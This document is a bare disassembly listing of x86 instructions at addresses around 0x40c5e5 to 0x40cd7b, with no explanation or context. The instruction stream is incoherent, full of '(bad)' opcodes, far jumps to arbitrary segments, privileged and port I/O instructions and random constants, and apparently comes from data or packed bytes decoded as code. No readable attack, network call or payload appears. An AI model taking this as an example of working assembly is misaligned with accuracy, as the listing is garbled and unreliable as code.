  40c5e5:	call   0xa98bcd3f
  40c5ea:	inc    DWORD PTR es:[edx-0x24]
  40c5ee:	stc    
  40c5ef:	pop    ss
  40c5f0:	jno    0x40c589
  40c5f2:	sbb    BYTE PTR [edx],dh
  40c5f4:	frstor [esi-0x72]
  40c5f7:	fistp  WORD PTR [ebp-0x19640001]
  40c5fd:	je     0x40c57f
  40c5ff:	popf   
  40c600:	stc    
  40c601:	mov    eax,0xb8a9d4e1
  40c606:	shl    DWORD PTR [ebx-0x2cc590b9],cl
  40c60c:	aad    0x1
  40c60e:	dec    ebx
  40c60f:	xchg   ecx,eax
  40c610:	push   eax
  40c611:	aas    
  40c612:	xchg   ecx,eax
  40c613:	test   DWORD PTR [eax],edi
  40c615:	sub    al,dh
  40c617:	pop    esi
  40c618:	rcr    DWORD PTR [edx],0x35
  40c61b:	or     BYTE PTR [ecx+0x3b],bl
  40c61e:	push   0x30
  40c620:	mov    bl,BYTE PTR [ecx+0x34]
  40c623:	lahf   
  40c624:	pushf  
  40c625:	add    al,BYTE PTR [esi]
  40c627:	mov    esi,0x326671cb
  40c62c:	loope  0x40c670
  40c62e:	adc    BYTE PTR [edi+0x7038a016],ah
  40c634:	push   eax
  40c635:	jge    0x40c66f
  40c637:	hlt    
  40c638:	pop    ebx
  40c639:	sbb    eax,0x2e6477ea
  40c63e:	sbb    DWORD PTR gs:[eax+0x209c8e08],ebx
  40c645:	pop    esp
  40c646:	lods   al,BYTE PTR ds:[esi]
  40c647:	addr16 add al,0x85
  40c64a:	(bad)  [edx+0x5f722ca3]
  40c650:	retf   
  40c651:	aad    0xc0
  40c653:	and    eax,0x804f7c9c
  40c658:	jbe    0x40c68b
  40c65a:	test   DWORD PTR [esi+ebp*1-0x371cebdc],0x6cbe1d64
  40c665:	mov    edi,0xae6e25ca
  40c66a:	mov    esp,0xdb154881
  40c66f:	xor    BYTE PTR [esi],0xcf
  40c672:	fsub   DWORD PTR [edi-0xa]
  40c675:	sub    eax,0xced12daf
  40c67a:	add    al,0x5c
  40c67c:	xor    al,0x9d
  40c67e:	dec    esp
  40c67f:	test   al,0x3
  40c681:	outs   dx,DWORD PTR ds:[esi]
  40c682:	clc    
  40c683:	mov    cl,0xb5
  40c685:	aas    
  40c686:	into   
  40c687:	ja     0x40c6bf
  40c689:	ins    BYTE PTR es:[edi],dx
  40c68a:	repnz xchg ebp,eax
  40c68c:	or     eax,0x58f6cc24
  40c691:	outs   dx,DWORD PTR ds:[esi]
  40c692:	jmp    0xc6f5:0x85ebf6c2
  40c699:	mov    edx,0x8917fe7f
  40c69e:	mov    edi,0x5bbfa090
  40c6a3:	sbb    bh,BYTE PTR [edi-0xf]
  40c6a6:	arpl   di,ax
  40c6a8:	test   al,0x8c
  40c6aa:	adc    edi,esp
  40c6ac:	repnz sub eax,DWORD PTR [esi+edx*1-0x30]
  40c6b1:	adc    BYTE PTR [esi+0x4ed874ff],bl
  40c6b7:	ins    DWORD PTR es:[edi],dx
  40c6b8:	fdivr  DWORD PTR [esi]
  40c6ba:	jb     0x40c705
  40c6bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6bd:	inc    esp
  40c6be:	mov    edx,0x59decc1f
  40c6c3:	dec    edx
  40c6c4:	jno    0x40c651
  40c6c6:	sbb    al,0x20
  40c6c8:	xchg   esp,eax
  40c6c9:	jmp    DWORD PTR [ebp+0x4e9e3f23]
  40c6cf:	push   esi
  40c6d0:	out    0x4,eax
  40c6d2:	xchg   DWORD PTR [eax-0x33de8964],ecx
  40c6d8:	inc    esp
  40c6d9:	jecxz  0x40c745
  40c6db:	shl    DWORD PTR [ebx+0x6258b71d],cl
  40c6e1:	pushf  
  40c6e2:	test   BYTE PTR [ebx-0x1190c842],al
  40c6e8:	aas    
  40c6e9:	and    edi,ebx
  40c6eb:	fld    TBYTE PTR [ebx+0x6e436004]
  40c6f1:	dec    edx
  40c6f2:	(bad)  [eax-0x25]
  40c6f5:	sbb    eax,0xb6564bbd
  40c6fa:	dec    ecx
  40c6fb:	dec    ebx
  40c6fc:	adc    esi,DWORD PTR [ecx+0x7d]
  40c6ff:	gs aad 0xf8
  40c702:	or     BYTE PTR [eax],dl
  40c704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c705:	jbe    0x40c6c3
  40c707:	pop    ebp
  40c708:	das    
  40c709:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c70a:	inc    esp
  40c70b:	pop    edi
  40c70c:	popa   
  40c70d:	arpl   WORD PTR [esi-0x48325832],si
  40c713:	imul   esi,DWORD PTR [edx-0x4b2715da],0x2d
  40c71a:	pusha  
  40c71b:	push   ss
  40c71c:	dec    edi
  40c71d:	mov    ebp,0x29775325
  40c722:	xchg   edi,eax
  40c723:	jne    0x40c6dc
  40c725:	adc    DWORD PTR [edx-0x6c65cdc],0xa26e150b
  40c72f:	jmp    0x40c6ce
  40c731:	sbb    al,0x3
  40c733:	fdivr  st,st(4)
  40c735:	aad    0xf3
  40c737:	rol    cl,cl
  40c739:	or     edi,edi
  40c73b:	dec    eax
  40c73c:	pop    edx
  40c73d:	push   cs
  40c73e:	xchg   BYTE PTR [eax+0x4a],ah
  40c741:	mov    BYTE PTR [esi+0x50ecf504],ah
  40c747:	rcr    BYTE PTR [ecx+0x15],cl
  40c74a:	int3   
  40c74b:	mov    esi,0xb36d980
  40c750:	pop    ds
  40c751:	jge    0x40c6fb
  40c753:	lea    ebx,ds:0x79906290
  40c759:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40c75b:	push   esp
  40c75c:	ins    DWORD PTR es:[edi],dx
  40c75d:	cmc    
  40c75e:	lods   al,BYTE PTR ds:[esi]
  40c75f:	ror    BYTE PTR [edi-0x67],1
  40c762:	inc    ecx
  40c763:	loope  0x40c755
  40c765:	add    BYTE PTR [esi],0x64
  40c768:	les    edx,FWORD PTR [ecx]
  40c76a:	daa    
  40c76b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c76c:	ret    0x2b3d
  40c76f:	inc    ebp
  40c770:	or     DWORD PTR [ecx-0x19],ecx
  40c773:	sub    BYTE PTR [edi+ebp*8+0x7c],al
  40c777:	std    
  40c778:	add    edi,DWORD PTR [esp+ebx*8-0x4710a701]
  40c77f:	or     al,0xfb
  40c781:	mov    ch,0x68
  40c783:	repz cld 
  40c785:	jnp    0x40c802
  40c787:	mov    DWORD PTR [ebp-0x6fe7a06f],0xb47b8148
  40c791:	or     eax,0x2aac1ee0
  40c796:	push   DWORD PTR [edx-0x3047e4e7]
  40c79c:	or     eax,DWORD PTR [ecx+0x463ba805]
  40c7a2:	jl     0x40c7f1
  40c7a4:	add    eax,0x2de7e36b
  40c7a9:	lahf   
  40c7aa:	pop    ss
  40c7ab:	data16 mov bh,0x24
  40c7ae:	test   DWORD PTR [eax+edx*8+0x61],edi
  40c7b2:	mov    ah,0xb9
  40c7b4:	adc    ebx,esp
  40c7b6:	fucom  st(7)
  40c7b8:	(bad)  
  40c7ba:	push   0xcd4eb3e6
  40c7bf:	out    dx,al
  40c7c0:	mov    eax,es:0x311650f2
  40c7c6:	cli    
  40c7c7:	mov    edi,cr6
  40c7ca:	mov    ch,0x2d
  40c7cc:	(bad)  
  40c7cd:	jbe    0x40c7f4
  40c7cf:	fwait
  40c7d0:	and    ch,BYTE PTR [edi]
  40c7d2:	and    BYTE PTR [ebx],ch
  40c7d4:	xchg   ebp,eax
  40c7d5:	cmp    eax,0xd4d8110e
  40c7da:	aas    
  40c7db:	(bad)  
  40c7dd:	pushf  
  40c7de:	idiv   BYTE PTR [ebp-0x60]
  40c7e1:	add    bl,0x38
  40c7e4:	or     edi,0x9ec6cdca
  40c7ea:	push   edi
  40c7eb:	fucomp st(6)
  40c7ed:	call   0xa6fe:0x4ef12601
  40c7f4:	out    0xa3,al
  40c7f6:	mov    dl,0x6d
  40c7f8:	push   ds
  40c7f9:	xchg   ebx,eax
  40c7fa:	dec    esi
  40c7fb:	imul   edx,DWORD PTR [edx],0xffffffbd
  40c7fe:	ds aas 
  40c800:	gs dec ebx
  40c802:	popa   
  40c803:	xor    bl,dh
  40c805:	or     edx,DWORD PTR [esi-0x3273e1a0]
  40c80b:	aam    0xbe
  40c80d:	pop    esi
  40c80e:	test   ax,0xbfa0
  40c812:	dec    ebp
  40c813:	sbb    al,0xf
  40c815:	ret    
  40c816:	outs   dx,DWORD PTR ds:[esi]
  40c817:	out    0x54,al
  40c819:	lahf   
  40c81a:	outs   dx,BYTE PTR ds:[esi]
  40c81b:	jae    0x40c84a
  40c81d:	dec    eax
  40c81e:	mov    ecx,0x85de9804
  40c823:	aad    0x9
  40c825:	xchg   ebx,eax
  40c826:	shl    DWORD PTR [ebx+ecx*8],0xd9
  40c82a:	or     eax,0xf30ee05f
  40c82f:	or     edi,ebp
  40c831:	stc    
  40c832:	repz mov bl,0x3d
  40c835:	cmp    eax,0x70a32767
  40c83a:	xchg   dh,bl
  40c83c:	es jmp 0x1f36:0x6a714b59
  40c844:	jle    0x40c887
  40c846:	dec    edx
  40c847:	cmp    dh,dh
  40c849:	out    dx,eax
  40c84a:	mov    DWORD PTR [ebx+0x3788358b],ebp
  40c850:	adc    BYTE PTR [edx-0x4345c8e7],dl
  40c856:	pop    edx
  40c857:	and    BYTE PTR [ecx-0x53d861c4],ch
  40c85d:	xor    BYTE PTR [ebp+0x6c22e017],0xa1
  40c864:	cmp    edx,esi
  40c866:	lea    edx,[ebp-0x7ec2adcb]
  40c86c:	(bad)  
  40c86d:	in     eax,0x4d
  40c86f:	mov    dl,0x1b
  40c871:	xor    eax,eax
  40c873:	mov    bh,BYTE PTR [esi-0x70]
  40c876:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c877:	xchg   edx,eax
  40c878:	inc    ebx
  40c879:	pop    edx
  40c87a:	jnp    0x40c82f
  40c87c:	icebp  
  40c87d:	pop    ds
  40c87e:	push   edi
  40c87f:	add    ebp,ebp
  40c881:	stos   DWORD PTR es:[edi],eax
  40c882:	int    0x81
  40c884:	das    
  40c885:	(bad)  [esi]
  40c887:	in     eax,0x39
  40c889:	test   eax,0x77e92758
  40c88e:	fldenv [ebp-0x23]
  40c891:	je     0x40c85e
  40c893:	(bad)  
  40c894:	or     DWORD PTR [ecx+0x72b2ad45],eax
  40c89a:	out    0x24,al
  40c89c:	loope  0x40c892
  40c89e:	fnsave [ecx+0xa2d1f06]
  40c8a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c8a5:	mov    dl,0x36
  40c8a7:	or     edx,edi
  40c8a9:	daa    
  40c8aa:	(bad)  
  40c8ab:	dec    ebp
  40c8ac:	mov    edi,eax
  40c8ae:	and    eax,0x38cd089b
  40c8b3:	jecxz  0x40c84f
  40c8b5:	xchg   edx,eax
  40c8b6:	adc    DWORD PTR [ebp+0x64026555],0x57ea4ba6
  40c8c0:	aam    0xed
  40c8c2:	xor    al,0x69
  40c8c4:	test   bh,dh
  40c8c6:	pop    edx
  40c8c7:	test   eax,0x205c6233
  40c8cc:	iret   
  40c8cd:	ror    DWORD PTR [ebx-0x2a962b01],1
  40c8d3:	mov    ch,BYTE PTR [edi+0x6d]
  40c8d6:	je     0x40c8d9
  40c8d8:	aam    0x21
  40c8da:	mov    al,ds:0x92dba710
  40c8df:	inc    edi
  40c8e0:	shr    ecx,1
  40c8e2:	call   0xaa30:0x5c3ec9e2
  40c8e9:	add    esi,edx
  40c8eb:	jb     0x40c883
  40c8ed:	bound  esi,QWORD PTR [edx-0x4e766883]
  40c8f3:	add    ch,ah
  40c8f5:	adc    al,BYTE PTR [edi+0x1fa27676]
  40c8fb:	push   0x4901e853
  40c900:	(bad)  
  40c901:	loope  0x40c8cf
  40c903:	stc    
  40c904:	xlat   BYTE PTR ds:[ebx]
  40c905:	les    ebx,FWORD PTR [edi]
  40c907:	adc    eax,0xb800008f
  40c90c:	mov    edi,esi
  40c90e:	addr16 push ebx
  40c910:	mov    ah,0xa
  40c912:	dec    edi
  40c913:	push   edi
  40c914:	adc    eax,0xcf4e0e09
  40c919:	ds pop ss
  40c91b:	pop    DWORD PTR [esi]
  40c91d:	test   DWORD PTR [edx-0x3f649401],eax
  40c923:	push   eax
  40c924:	pop    es
  40c925:	pop    ebx
  40c926:	stos   DWORD PTR es:[edi],eax
  40c927:	cmp    al,0x12
  40c929:	xchg   ecx,eax
  40c92a:	add    eax,0x14241038
  40c92f:	into   
  40c930:	icebp  
  40c931:	add    al,0xca
  40c933:	out    0xf4,eax
  40c935:	dec    esi
  40c936:	leave  
  40c937:	add    BYTE PTR ds:[ebx],dl
  40c93a:	adc    al,0xfe
  40c93c:	dec    esp
  40c93d:	inc    eax
  40c93e:	xor    eax,0xdcef1255
  40c943:	call   0x9650:0x60b6b779
  40c94a:	mov    esp,0x5dc70a09
  40c94f:	nop
  40c950:	into   
  40c951:	in     eax,dx
  40c952:	add    esp,esi
  40c954:	std    
  40c955:	hlt    
  40c956:	sbb    BYTE PTR [ecx],cl
  40c958:	adc    esi,DWORD PTR [ebx]
  40c95a:	aam    0x21
  40c95c:	sbb    BYTE PTR [eax+edx*2+0x2e],0x84
  40c961:	xchg   BYTE PTR [edi-0x258a4aa4],ch
  40c967:	(bad)  
  40c968:	call   0x9ccbfefc
  40c96d:	popa   
  40c96e:	(bad)  
  40c96f:	scas   al,BYTE PTR es:[edi]
  40c970:	aas    
  40c971:	lock jmp 0xc572:0x9f9cf298
  40c979:	mov    WORD PTR [ecx+0x577b8c7b],gs
  40c97f:	jmp    0x7f1f2a7c
  40c984:	push   0x7bbb4a91
  40c989:	out    dx,eax
  40c98a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c98b:	cmc    
  40c98c:	or     ah,al
  40c98e:	adc    BYTE PTR ds:0xcdd030c2,bl
  40c994:	or     al,0xed
  40c996:	retf   
  40c997:	pop    es
  40c998:	or     al,0xe5
  40c99a:	jmp    0x40c942
  40c99c:	push   edi
  40c99d:	stos   DWORD PTR es:[edi],eax
  40c99e:	repnz stc 
  40c9a0:	sub    al,0xb1
  40c9a2:	jns    0x40c9c1
  40c9a4:	popf   
  40c9a5:	in     eax,dx
  40c9a6:	jne    0x40c936
  40c9a8:	je     0x40c9d8
  40c9aa:	mov    dh,0x31
  40c9ac:	sbb    edx,esp
  40c9ae:	push   esi
  40c9af:	and    esp,eax
  40c9b1:	(bad)  
  40c9b2:	cwde   
  40c9b3:	adc    ah,BYTE PTR [esi-0x5e91d063]
  40c9b9:	not    BYTE PTR [ecx]
  40c9bb:	cli    
  40c9bc:	fwait
  40c9bd:	cli    
  40c9be:	push   0x9659bbd2
  40c9c3:	cli    
  40c9c4:	push   esp
  40c9c5:	xchg   esp,eax
  40c9c6:	or     BYTE PTR [ebp-0x2f70294a],0xe0
  40c9cd:	cli    
  40c9ce:	pop    esp
  40c9cf:	inc    ecx
  40c9d0:	dec    ebp
  40c9d1:	nop
  40c9d2:	cmp    BYTE PTR [ecx+0x29421c0c],ah
  40c9d8:	lea    edi,ds:0xe77f3484
  40c9de:	dec    ebp
  40c9df:	mov    al,0xcd
  40c9e1:	jmp    0x6305:0x6b9e3e01
  40c9e8:	ds nop
  40c9ea:	ret    
  40c9eb:	inc    ebp
  40c9ec:	push   ss
  40c9ed:	test   BYTE PTR [edi+0x5a],0xb5
  40c9f1:	adc    eax,0xb17ce1a9
  40c9f6:	fldenv [edx]
  40c9f8:	pop    es
  40c9f9:	sub    ch,al
  40c9fb:	xor    eax,0x7358d03f
  40ca00:	loope  0x40c9e1
  40ca02:	pusha  
  40ca03:	cld    
  40ca04:	sbb    al,0x97
  40ca06:	inc    ecx
  40ca07:	pop    ds
  40ca08:	adc    ch,BYTE PTR [esp+edi*8+0x48]
  40ca0c:	sbb    eax,0xacd9d2ea
  40ca11:	add    esp,ecx
  40ca13:	lock (bad) 
  40ca15:	in     al,dx
  40ca16:	jle    0x40ca52
  40ca18:	inc    esi
  40ca19:	xor    BYTE PTR [edx-0x35],dl
  40ca1c:	sbb    DWORD PTR [ebx],esp
  40ca1e:	mov    esp,0x370353e5
  40ca23:	jmp    DWORD PTR ds:0xd014d504
  40ca29:	dec    ebp
  40ca2a:	lock fs xchg esi,eax
  40ca2d:	out    0x1a,eax
  40ca2f:	shl    BYTE PTR [ecx-0x5e],0xfc
  40ca33:	jbe    0x40ca57
  40ca35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca36:	lods   eax,DWORD PTR ds:[esi]
  40ca37:	shr    BYTE PTR [edi],0x92
  40ca3a:	sub    ebp,ebp
  40ca3c:	rol    DWORD PTR ds:0x172058b8,0xfd
  40ca43:	aam    0x83
  40ca45:	add    eax,0x465f63eb
  40ca4a:	pop    ebx
  40ca4b:	cmc    
  40ca4c:	std    
  40ca4d:	or     ecx,edx
  40ca4f:	cmp    eax,0xf61937be
  40ca54:	ja     0x40ca19
  40ca56:	ret    
  40ca57:	(bad)  
  40ca58:	ss pop esp
  40ca5a:	arpl   WORD PTR [ebx-0x7e040841],si
  40ca60:	stos   BYTE PTR es:[edi],al
  40ca61:	inc    edi
  40ca62:	cmp    ebx,DWORD PTR [ebx+ebp*4+0x3502f20a]
  40ca69:	and    esp,DWORD PTR [edi+0x51006b53]
  40ca6f:	pushf  
  40ca70:	jecxz  0x40ca6c
  40ca72:	cwde   
  40ca73:	ret    
  40ca74:	pusha  
  40ca75:	ss pushf 
  40ca77:	xor    eax,0xdb391245
  40ca7c:	mov    cl,BYTE PTR [edi]
  40ca7e:	and    WORD PTR [ebp+eiz*1+0x7],0xb4e7
  40ca85:	call   0xec91:0x8b7163df
  40ca8c:	ficomp DWORD PTR [eax]
  40ca8e:	arpl   WORD PTR [ecx-0x1db38f85],di
  40ca94:	lods   al,BYTE PTR ds:[esi]
  40ca95:	(bad)  
  40ca96:	repz mov edi,0x2b2bcfec
  40ca9c:	int3   
  40ca9d:	fidivr WORD PTR [edx+0x25a1728f]
  40caa3:	aaa    
  40caa4:	dec    ecx
  40caa5:	sbb    ch,ah
  40caa7:	jmp    0x75d4b241
  40caac:	sub    ch,BYTE PTR ds:[ecx+0x39a6610a]
  40cab3:	int3   
  40cab4:	pop    esi
  40cab5:	xor    ebp,DWORD PTR [esp+edi*4+0x5d]
  40cab9:	xchg   esp,eax
  40caba:	jmp    0xee20:0x2a414e8f
  40cac1:	bound  ebx,QWORD PTR [edi-0x20]
  40cac4:	or     ah,BYTE PTR [ebx-0x72]
  40cac7:	lods   al,BYTE PTR ds:[esi]
  40cac8:	or     DWORD PTR [esi],ebx
  40caca:	cmp    ch,BYTE PTR [eax-0x78687228]
  40cad0:	ret    
  40cad1:	sbb    eax,0x696ce9fc
  40cad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cad7:	gs push ecx
  40cad9:	or     al,0x97
  40cadb:	inc    edx
  40cadc:	jg     0x40cb0f
  40cade:	sti    
  40cadf:	push   esi
  40cae0:	jno    0x40cb0e
  40cae2:	mov    dl,0x80
  40cae4:	fcmovb st,st(5)
  40cae6:	ret    0xe12e
  40cae9:	sbb    al,0xb9
  40caeb:	jmp    FWORD PTR [ecx+edx*1+0x1]
  40caef:	hlt    
  40caf0:	sbb    BYTE PTR [eax],dl
  40caf2:	scas   al,BYTE PTR es:[edi]
  40caf3:	fsubr  QWORD PTR [edx]
  40caf5:	out    dx,eax
  40caf6:	rcl    BYTE PTR [eax+0x22],cl
  40caf9:	out    0x9b,al
  40cafb:	mov    ebx,0x18137f77
  40cb00:	nop
  40cb01:	das    
  40cb02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb03:	inc    edx
  40cb04:	rcr    edx,1
  40cb06:	jo     0x40cab5
  40cb08:	push   cs
  40cb09:	add    esp,esp
  40cb0b:	popf   
  40cb0c:	outs   dx,DWORD PTR ds:[esi]
  40cb0d:	add    DWORD PTR [ebx+0x31],ecx
  40cb10:	dec    ecx
  40cb11:	push   ds
  40cb12:	xchg   edx,eax
  40cb13:	mov    BYTE PTR [ebx],ah
  40cb15:	dec    ecx
  40cb16:	xchg   ebp,eax
  40cb17:	push   ebx
  40cb18:	dec    ebp
  40cb19:	stc    
  40cb1a:	xchg   ecx,eax
  40cb1b:	jo     0x40cb87
  40cb1d:	sub    al,BYTE PTR [esi+0x3f]
  40cb20:	fs jo  0x40cb20
  40cb23:	pop    ebp
  40cb24:	sbb    DWORD PTR [ecx-0x72],ebx
  40cb27:	aam    0xe3
  40cb29:	cmp    dh,ah
  40cb2b:	push   edx
  40cb2c:	test   DWORD PTR [eax+0x3b08f3f9],ecx
  40cb32:	rcr    BYTE PTR [ebp+0x1420d8af],cl
  40cb38:	in     eax,0x9c
  40cb3a:	dec    edx
  40cb3b:	les    ecx,FWORD PTR [esi+0x6c083e71]
  40cb41:	or     BYTE PTR [eax+0x3340f516],0x22
  40cb48:	or     BYTE PTR [eax],ah
  40cb4a:	pop    esi
  40cb4b:	inc    edi
  40cb4c:	in     al,0x2c
  40cb4e:	icebp  
  40cb4f:	aas    
  40cb50:	pusha  
  40cb51:	inc    eax
  40cb52:	adc    ebp,DWORD PTR [edi+0x5f]
  40cb55:	push   0x6
  40cb57:	pusha  
  40cb58:	gs inc esi
  40cb5a:	fdivp  st(0),st
  40cb5c:	out    0xbe,al
  40cb5e:	xchg   edx,eax
  40cb5f:	test   DWORD PTR [ebp-0x523ca8a9],edx
  40cb65:	jb     0x40cb30
  40cb67:	int3   
  40cb68:	in     eax,dx
  40cb69:	dec    edi
  40cb6a:	aaa    
  40cb6b:	mov    cl,0x32
  40cb6d:	cmp    eax,0x546842d8
  40cb72:	and    DWORD PTR [esi],ebx
  40cb74:	push   0xffffffe7
  40cb76:	ins    DWORD PTR es:[edi],dx
  40cb77:	adc    al,0xde
  40cb79:	loope  0x40cbe7
  40cb7b:	dec    BYTE PTR [ebx+0x44]
  40cb7e:	mov    dh,0x7d
  40cb80:	fwait
  40cb81:	ret    0xcfa2
  40cb84:	in     al,dx
  40cb85:	(bad)  
  40cb87:	xchg   ebp,eax
  40cb88:	jae    0x40cbd5
  40cb8a:	xchg   DWORD PTR [edi+0x60dba9f5],ecx
  40cb90:	mov    bh,BYTE PTR [edx+eax*2+0x50]
  40cb94:	adc    eax,0x8c46bd0d
  40cb99:	sbb    DWORD PTR [ecx+0x1aaa1cb1],ecx
  40cb9f:	ficom  WORD PTR [eax+0x2a]
  40cba2:	xchg   ebp,eax
  40cba3:	mov    ebx,0xe1760cec
  40cba8:	adc    eax,0x36005a21
  40cbad:	mov    bh,0xba
  40cbaf:	mov    eax,0x3df819c8
  40cbb4:	cmp    al,0x2d
  40cbb6:	dec    ebx
  40cbb7:	mov    WORD PTR [ecx],?
  40cbb9:	outs   dx,DWORD PTR ds:[esi]
  40cbba:	push   ss
  40cbbb:	push   ss
  40cbbc:	jecxz  0x40cbae
  40cbbe:	stc    
  40cbbf:	test   BYTE PTR [ebx-0x39],bh
  40cbc2:	data16 cmp BYTE PTR [ebp+0x7b8db346],0xca
  40cbca:	into   
  40cbcb:	test   DWORD PTR [ecx+edx*8],ebx
  40cbce:	mov    al,ds:0x29cd6aee
  40cbd3:	repnz int3 
  40cbd5:	inc    ecx
  40cbd6:	mov    ch,0x55
  40cbd8:	stc    
  40cbd9:	xchg   ebx,eax
  40cbda:	rol    DWORD PTR [esi-0xc07297],0xe9
  40cbe1:	stos   DWORD PTR es:[edi],eax
  40cbe2:	mov    edi,0xc85650a1
  40cbe7:	(bad)  
  40cbe8:	es sti 
  40cbea:	adc    bh,BYTE PTR [ecx+0x30]
  40cbed:	fdivr  QWORD PTR [edi+0x722a9e]
  40cbf3:	les    ebp,FWORD PTR [eax-0x19c27e1c]
  40cbf9:	mov    ds:0xb31a3ca8,al
  40cbfe:	mov    cl,0x9d
  40cc00:	leave  
  40cc01:	pop    edi
  40cc02:	(bad)  
  40cc03:	les    eax,FWORD PTR [ecx-0x83ab384]
  40cc09:	pop    es
  40cc0a:	(bad)  
  40cc0b:	cmp    al,0x98
  40cc0d:	mov    ecx,0x373ce59e
  40cc12:	aas    
  40cc13:	in     eax,0xc8
  40cc15:	pop    ds
  40cc16:	mov    dl,BYTE PTR [edi]
  40cc18:	mov    ds:0xb5d62a31,eax
  40cc1d:	ds cwde 
  40cc1f:	or     ecx,DWORD PTR ds:0xb59c7e75
  40cc25:	retf   
  40cc26:	retf   
  40cc27:	cli    
  40cc28:	js     0x40cc1a
  40cc2a:	sbb    DWORD PTR [eax+0xac96e9e],edx
  40cc30:	push   edi
  40cc31:	ss inc esp
  40cc33:	adc    BYTE PTR [esi-0x51],ah
  40cc36:	sti    
  40cc37:	add    BYTE PTR [ebx-0xa1a368e],bl
  40cc3d:	hlt    
  40cc3e:	jnp    0x40cbe7
  40cc40:	lods   eax,DWORD PTR ds:[esi]
  40cc41:	cmp    ch,BYTE PTR [edx-0x5673235]
  40cc47:	mov    eax,0x60a89a9c
  40cc4c:	adc    DWORD PTR [edi],esi
  40cc4e:	add    DWORD PTR [esi-0x452c93e5],edi
  40cc54:	inc    ebp
  40cc55:	xor    bl,BYTE PTR ds:0xfa56e732
  40cc5b:	mov    ch,BYTE PTR [eax]
  40cc5d:	push   ecx
  40cc5e:	or     BYTE PTR [ebx-0x1],al
  40cc61:	xor    al,0x1f
  40cc63:	dec    edi
  40cc64:	or     BYTE PTR [edx+0x0],bl
  40cc67:	clc    
  40cc68:	jb     0x40cc2e
  40cc6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc6b:	xor    al,0x4e
  40cc6d:	test   DWORD PTR [edx-0x51],edi
  40cc70:	mov    bh,0xc6
  40cc72:	(bad)
  40cc75:	shr    esp,0x69
  40cc78:	pop    DWORD PTR [eax+edx*4]
  40cc7b:	outs   dx,DWORD PTR ds:[esi]
  40cc7c:	jecxz  0x40cce5
  40cc7e:	test   eax,0xaef7da92
  40cc83:	hlt    
  40cc84:	push   ax
  40cc86:	dec    edi
  40cc87:	sub    eax,0xfed5090a
  40cc8c:	xor    esi,DWORD PTR [edi+0x7efb1f74]
  40cc92:	mov    dl,0xb5
  40cc94:	mov    al,ds:0xef7b701a
  40cc99:	repz jns 0x40ccef
  40cc9c:	popa   
  40cc9d:	jns    0x40cd0e
  40cc9f:	es sub al,0x97
  40cca2:	inc    eax
  40cca3:	or     DWORD PTR [edi+0x78eca5f7],esp
  40cca9:	cmp    DWORD PTR [eax-0x1b],esi
  40ccac:	lds    edx,FWORD PTR [ecx]
  40ccae:	jbe    0x40cc78
  40ccb0:	sub    DWORD PTR [esi-0x42156fb5],ebp
  40ccb6:	push   0x35014ff3
  40ccbb:	dec    ebx
  40ccbc:	push   edx
  40ccbd:	sub    eax,0xc0042ca9
  40ccc2:	mov    bh,0xf1
  40ccc4:	jno    0x40cc96
  40ccc6:	fcomp  QWORD PTR [eax+esi*1+0x530e7cc4]
  40cccd:	fs iret 
  40cccf:	shr    DWORD PTR [edx-0xe242bad],0x8c
  40ccd6:	or     edi,DWORD PTR [edx]
  40ccd8:	test   DWORD PTR [ecx],esi
  40ccda:	out    dx,eax
  40ccdb:	aad    0x19
  40ccdd:	xchg   edx,eax
  40ccde:	inc    ebx
  40ccdf:	fnstcw WORD PTR [ecx+0x2a203a7]
  40cce5:	push   ecx
  40cce6:	inc    DWORD PTR [esp+ecx*8-0x130f38c3]
  40cced:	pop    ebx
  40ccee:	xchg   esp,eax
  40ccef:	(bad)  
  40ccf0:	stc    
  40ccf1:	pop    es
  40ccf2:	cmp    eax,esp
  40ccf4:	or     cl,BYTE PTR [ebp+0x6d]
  40ccf7:	icebp  
  40ccf8:	inc    edi
  40ccf9:	sbb    eax,0x28004e6b
  40ccfe:	fmul   DWORD PTR [esi+0x2e]
  40cd01:	std    
  40cd02:	invd   
  40cd04:	lahf   
  40cd05:	scas   al,BYTE PTR es:[edi]
  40cd06:	sbb    dl,BYTE PTR [ecx-0x18b99848]
  40cd0c:	pop    es
  40cd0d:	cmc    
  40cd0e:	cmp    eax,0xe9758757
  40cd13:	mov    esi,0xc8726c3d
  40cd18:	sbb    DWORD PTR [esi],edx
  40cd1a:	or     al,0x27
  40cd1c:	and    ah,BYTE PTR [esi-0x18]
  40cd1f:	pusha  
  40cd20:	js     0x40ccbc
  40cd22:	mov    DWORD PTR ds:0x1506ac2d,esi
  40cd28:	les    esp,FWORD PTR [eax]
  40cd2a:	(bad)  
  40cd2b:	xchg   ecx,eax
  40cd2c:	call   0xcd7ad2f7
  40cd31:	ss (bad) 
  40cd33:	jmp    0xcf1e:0xeb8b2717
  40cd3a:	lahf   
  40cd3b:	push   es
  40cd3c:	adc    eax,0x1343c9d2
  40cd41:	fiadd  DWORD PTR [esi]
  40cd43:	jg     0x40cd64
  40cd45:	xor    DWORD PTR [edx+ebp*2],edx
  40cd48:	dec    ebp
  40cd49:	out    0x42,al
  40cd4b:	mov    cl,0xa3
  40cd4d:	fistp  DWORD PTR [edx]
  40cd4f:	das    
  40cd50:	sahf   
  40cd51:	sub    bh,ah
  40cd53:	(bad)  
  40cd54:	(bad)  
  40cd55:	mov    al,0xc3
  40cd57:	shr    BYTE PTR [edi-0x37],0xfa
  40cd5b:	stc    
  40cd5c:	cld    
  40cd5d:	push   ebx
  40cd5e:	fidivr WORD PTR [ecx]
  40cd60:	in     al,dx
  40cd61:	retf   
  40cd62:	mov    ebp,0xda56f2a4
  40cd67:	jmp    0x1aeb:0xe0aea8bb
  40cd6e:	fs jecxz 0x40cd4b
  40cd71:	dec    esi
  40cd72:	(bad)  
  40cd73:	std    
  40cd74:	and    cl,dh
  40cd76:	(bad)  
  40cd77:	callw  0x44b6
  40cd7b:	push   esp
